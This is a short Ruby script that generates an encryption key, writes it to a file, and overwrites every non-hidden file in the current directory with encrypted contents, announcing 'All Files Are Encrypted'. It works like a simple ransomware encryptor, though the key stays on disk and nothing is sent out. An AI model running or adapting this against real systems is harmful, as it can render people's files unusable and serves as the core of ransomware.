#!/usr/bin/env ruby
require "lockbox"

files = []

Dir.foreach(".") do |f|
   next if f == "enc.rb" || f.start_with?(".") || f == "TheKey.key" || f == "dec.rb"
   files.push(f)
end

key = Lockbox.generate_key()
box = Lockbox.new(key:key)

File.write("TheKey.key",key)

files.each do |f|
  content = File.binread(f)
  encrypted = box.encrypt(content)
  File.binwrite(f,encrypted)
end

puts "All Files Are Encrypted"
